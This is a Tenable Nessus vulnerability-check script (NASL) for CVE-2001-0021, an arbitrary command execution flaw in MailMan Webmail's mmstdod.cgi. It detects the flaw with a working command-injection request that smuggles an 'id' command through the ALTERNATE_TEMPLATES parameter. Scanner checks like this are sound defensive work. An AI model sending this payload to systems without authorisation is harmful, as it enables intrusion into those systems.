#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10566);
 script_version ("$Revision: 1.17 $");
 script_cve_id("CVE-2001-0021");
 script_bugtraq_id(2063);
 script_xref(name:"OSVDB", value:"465");

 script_name(english:"MailMan Webmail mmstdod.cgi Arbitrary Command Execution");
 script_summary(english:"Checks for the presence of /cgi-bin/mmstdod.cgi");
 
 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "A web application on the remote host has a command execution\n",
     "vulnerability."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The version of MailMan Webmail on the remote web server has an\n",
     "arbitrary command execution vulnerability.  Input to the\n",
     "'ALTERNATE_TEMPLATES' parameter of mmstdod.cgi is not properly\n",
     "sanitized.  A remote attacker could exploit this to execute\n",
     "arbitrary commands on the system."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/2000-12/0057.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to MailMan Webmail 3.0.26 or later."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C"
 );
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");

 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");

 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);

 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


req = "/mmstdod.cgi?ALTERNATE_TEMPLATES=|%20echo%20" + raw_string(0x22) + 
 			         "Content-Type:%20text%2Fhtml" + raw_string(0x22) +
				 "%3Becho%20" +
				 raw_string(0x22, 0x22) +
				 "%20%3B%20id%00";

http_check_remote_code (
			check_request:req,
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id"
			);
